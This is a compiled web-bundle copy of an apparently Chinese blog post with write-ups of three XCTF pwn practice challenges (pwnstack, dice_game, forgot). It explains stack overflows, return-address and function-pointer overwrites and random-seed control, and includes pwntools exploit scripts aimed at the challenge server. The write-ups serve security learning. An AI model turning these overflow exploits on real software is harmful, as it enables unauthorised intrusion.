(window.webpackJsonp=window.webpackJsonp||[]).push([[129],{492:function(s,t,a){"use strict";a.r(t);var n=a(11),e=Object(n.a)({},(function(){var s=this,t=s._self._c;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("p",[s._v("攻防世界pwn题目")]),s._v(" "),t("h2",{attrs:{id:"pwnstack"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#pwnstack"}},[s._v("#")]),s._v(" pwnstack")]),s._v(" "),t("p",[s._v("下载拖到ida64里反编译")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/0.png",alt:"0"}})]),s._v(" "),t("p",[s._v("进入到"),t("code",[s._v("vuln")]),s._v("函数，定义了一个160（0xa0）字节的缓冲区，存在一个"),t("code",[s._v("read")]),s._v("函数，会读取177（b1）个字节，导致栈溢出")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/1.png",alt:"1"}})]),s._v(" "),t("p",[s._v("查看汇编代码，看到后门函数，函数地址放在缓冲区后覆盖栈的返回地址"),t("code",[s._v("0x400762")])]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/2.png",alt:"2"}})]),s._v(" "),t("p",[s._v("或者通过"),t("code",[s._v("shift+f12")]),s._v("找到"),t("code",[s._v("/bin/sh")]),s._v("字符串，再通过在"),t("code",[s._v("/bin/sh")]),s._v("地址上"),t("code",[s._v("ctrl+x")]),s._v("找到它的引用，也可以找到后门函数的定义")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/3.png",alt:"3"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/4.png",alt:"4"}})]),s._v(" "),t("p",[s._v("ctf wiki用一个很好的概念来理解栈的结构，如下")]),s._v(" "),t("div",{staticClass:"language-txt line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-txt"}},[t("code",[s._v("                                           +-----------------+\n                                           |     retaddr     |\n                                           +-----------------+\n                                           |     saved ebp   |\n                                    ebp---\x3e+-----------------+\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                                           |                 |\n                              s,ebp-0x14--\x3e+-----------------+\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br")])]),t("p",[s._v("从图中可以看出，"),t("code",[s._v("s")]),s._v("变量一共可以传入的字节大小为"),t("code",[s._v("14")]),s._v(",如果超过的话，多出的就会到"),t("code",[s._v("saved ebp")]),s._v("中，根据我的查阅"),t("code",[s._v("saved ebp")]),s._v("保存的是"),t("code",[s._v("栈帧")]),s._v("，根据栈帧确定变量的返回值，"),t("code",[s._v("x86")]),s._v("中"),t("code",[s._v("saved ebp")]),s._v("的大小为"),t("code",[s._v("4个字节")]),s._v("，"),t("code",[s._v("x64")]),s._v("中"),t("code",[s._v("saved ebp")]),s._v("的大小为"),t("code",[s._v("8个字节")]),s._v("，最后的"),t("code",[s._v("retaddr")]),s._v("就是溢出的部分，我们可以控制"),t("code",[s._v("retaddr")]),s._v("的值，将其修改为我们想要执行函数的内存地址")]),s._v(" "),t("p",[s._v("看一下这题的文件类型，"),t("code",[s._v("64")]),s._v("位，所以"),t("code",[s._v("saved ebp")]),s._v("的大小为"),t("code",[s._v("8个字节")]),s._v("覆盖"),t("code",[s._v("saved ebp")]),s._v("，所以我们需要填充"),t("code",[s._v("0xa0+8=0xa8")]),s._v("个字节，然后，最后填入后门函数的地址"),t("code",[s._v("0x400762")])]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/5.png",alt:"5"}})]),s._v(" "),t("p",[s._v("最后发送"),t("code",[s._v("p64")]),s._v("函数包裹的数据，是为了让程序认为这是一个内存地址，不然接受的就是字符"),t("code",[s._v("0x400762")])]),s._v(" "),t("p",[s._v("编写exp：")]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 本地调试")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# p = process('./pwn2')")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 远程")]),s._v("\np "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'61.147.171.105'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("53646")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\npayload "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'a'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0xa0")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("8")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x400762")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br")])]),t("p",[t("img",{attrs:{src:"/medias/00pwn/6.png",alt:"6"}})]),s._v(" "),t("p",[s._v("远程可以打通，本地打不通，这是什么原因。把后门地址改成"),t("code",[s._v("0x400766")]),s._v("时，本地和远程都可以")]),s._v(" "),t("h2",{attrs:{id:"dice-game"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#dice-game"}},[s._v("#")]),s._v(" dice_game")]),s._v(" "),t("p",[s._v("ida64反编译，分析主函数，sub_A20，sub_B28等函数")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/7.png",alt:"7"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/8.png",alt:"8"}})]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/9.png",alt:"9"}})]),s._v(" "),t("p",[s._v("分析这三个函数大概可以知道，这是一个游戏，使用当前时间生成一个种子，调用sub_A20函数使用这个种子生成50个1-6之间的随机数，等待用户输入，如果50道全对，调用sub_B28函数读取flag")]),s._v(" "),t("p",[s._v("在ida里可以看到buf,seed在栈中，buf长度为55，seed长度为2，在0x10位置")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/10.png",alt:"10"}})]),s._v(" "),t("p",[s._v("可以通过buf，覆盖seed，从而控制种子，再利用题目给的libc库里定义的rand函数，就可以生成与题目一样的随机数")]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" ctypes "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 导入ctypes库，用于调用libc库中的函数")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#from LibcSearcher import *")]),s._v("\ncontext"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("log_level "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'debug'")]),s._v("  "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# 设置调试模式")]),s._v("\n\nr "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'61.147.171.105'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("54885")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nlibc "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" cdll"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("LoadLibrary"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v('"libc.so.6"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#利用题目给的libc库中的函数rand生成与题目一样的随机数。")]),s._v("\n\npayload"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'a'")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x50")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x10")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v("p64"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendafter"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Welcome, let me know your name: '")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\na"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" i "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("range")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("50")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    a"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("append"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("libc"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("rand"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("%")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("6")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("a"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" i "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("in")]),s._v(" a"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v("\n    r"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("print")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("r"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("recv"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n    r"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendline"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token builtin"}},[s._v("str")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("i"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n\nr"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br"),t("span",{staticClass:"line-number"},[s._v("9")]),t("br"),t("span",{staticClass:"line-number"},[s._v("10")]),t("br"),t("span",{staticClass:"line-number"},[s._v("11")]),t("br"),t("span",{staticClass:"line-number"},[s._v("12")]),t("br"),t("span",{staticClass:"line-number"},[s._v("13")]),t("br"),t("span",{staticClass:"line-number"},[s._v("14")]),t("br"),t("span",{staticClass:"line-number"},[s._v("15")]),t("br"),t("span",{staticClass:"line-number"},[s._v("16")]),t("br"),t("span",{staticClass:"line-number"},[s._v("17")]),t("br"),t("span",{staticClass:"line-number"},[s._v("18")]),t("br"),t("span",{staticClass:"line-number"},[s._v("19")]),t("br"),t("span",{staticClass:"line-number"},[s._v("20")]),t("br"),t("span",{staticClass:"line-number"},[s._v("21")]),t("br"),t("span",{staticClass:"line-number"},[s._v("22")]),t("br"),t("span",{staticClass:"line-number"},[s._v("23")]),t("br"),t("span",{staticClass:"line-number"},[s._v("24")]),t("br")])]),t("p",[t("img",{attrs:{src:"/medias/00pwn/11.png",alt:"11"}})]),s._v(" "),t("h2",{attrs:{id:"forgot"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#forgot"}},[s._v("#")]),s._v(" forgot")]),s._v(" "),t("p",[s._v("检测一下，32位程序，没有栈保护")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/12.png",alt:"12"}})]),s._v(" "),t("p",[s._v("反编译分析，定义了长度为32位字节的s，作为用户名来接收，可以随便输入。定义了v3，存入了几个函数的地址")]),s._v(" "),t("p",[s._v("定义了长度为32的v2，使用"),t("code",[s._v("scanf")]),s._v("函数接收，没有限制长度，存在栈溢出")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/13.png",alt:"13"}})]),s._v(" "),t("p",[s._v("根据定义的v2,v3，发现缓冲区里可以使用v2溢出覆盖v3")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/14.png",alt:"14"}})]),s._v(" "),t("p",[s._v("在程序的最后有一处动态函数调用")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/15.png",alt:"15"}})]),s._v(" "),t("p",[t("code",[s._v("shift+f12")]),s._v("跟进引用，找到"),t("code",[s._v("cat flag")]),s._v("的函数"),t("code",[s._v("sub_80486CC")])]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/16.png",alt:"16"}})]),s._v(" "),t("p",[s._v("所以需要把"),t("code",[s._v("v3[--v5]")]),s._v("也就是"),t("code",[s._v("v3[1]")]),s._v("的地址覆盖为"),t("code",[s._v("sub_80486CC")]),s._v("函数的地址"),t("code",[s._v("0x80486CC")])]),s._v(" "),t("p",[s._v("在这个循环中，会对输入的每一位字符进行检测，如果符合就更改v5的值，进入下一层检测，跟着他的要求做要找到合适的email格式，以及函数地址的改变，题目会变得更难，直接在第一个检测里找到不符合的字符，使每一位都不符合，这样v5就不需要改变了。在检测结束就可以调用目标函数")]),s._v(" "),t("p",[t("img",{attrs:{src:"/medias/00pwn/17.png",alt:"17"}})]),s._v(" "),t("p",[s._v("在第一个检测中，检查是否是小写字母、数字，或是特定的几个符号下划线、减号、加号、点，拿大写字母绕过就可以了")]),s._v(" "),t("div",{staticClass:"language-c line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-c"}},[t("code",[s._v("_BOOL4 __cdecl "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sub_8048702")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("char")]),s._v(" a1"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n  "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" a1 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("96")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" a1 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("122")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" a1 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("47")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&&")]),s._v(" a1 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("57")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" a1 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("95")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" a1 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("45")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" a1 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("43")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("||")]),s._v(" a1 "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("46")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br")])]),t("p",[s._v("编写exp")]),s._v(" "),t("div",{staticClass:"language-python line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-python"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" pwn "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("import")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v("\n\npayload "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("b'A'")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x20")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("+")]),s._v(" p32"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("0x80486cc")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("# p = process('./forgot')")]),s._v("\np "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" remote"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'61.147.171.105'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("61568")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendlineafter"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'> '")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'test'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("sendlineafter"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'> '")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v("payload"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\np"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("interactive"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br"),t("span",{staticClass:"line-number"},[s._v("4")]),t("br"),t("span",{staticClass:"line-number"},[s._v("5")]),t("br"),t("span",{staticClass:"line-number"},[s._v("6")]),t("br"),t("span",{staticClass:"line-number"},[s._v("7")]),t("br"),t("span",{staticClass:"line-number"},[s._v("8")]),t("br")])]),t("p",[s._v("参考：")]),s._v(" "),t("ul",[t("li",[t("a",{attrs:{href:"https://www.cnblogs.com/Junglezt/p/17871927.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("BUUCTF-pwn-rip(第一个栈溢出) "),t("OutboundLink")],1)]),s._v(" "),t("li",[t("a",{attrs:{href:"https://blog.csdn.net/m0_73605862/article/details/130919537",target:"_blank",rel:"noopener noreferrer"}},[s._v("攻防世界 pwnstack writeup"),t("OutboundLink")],1)]),s._v(" "),t("li",[t("a",{attrs:{href:"https://www.cnblogs.com/Mua2Uncle2blog/p/15505565.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("dice_game--攻防世界"),t("OutboundLink")],1)]),s._v(" "),t("li",[t("a",{attrs:{href:"https://blog.csdn.net/weixin_43876357/article/details/109028936",target:"_blank",rel:"noopener noreferrer"}},[s._v("攻防世界（PWN）forgot"),t("OutboundLink")],1)]),s._v(" "),t("li",[t("a",{attrs:{href:"https://sphandsomejack.github.io/2020/02/17/forgot/",target:"_blank",rel:"noopener noreferrer"}},[s._v("攻防世界进阶区forgot"),t("OutboundLink")],1)])])])}),[],!1,null,null,null);t.default=e.exports}}]);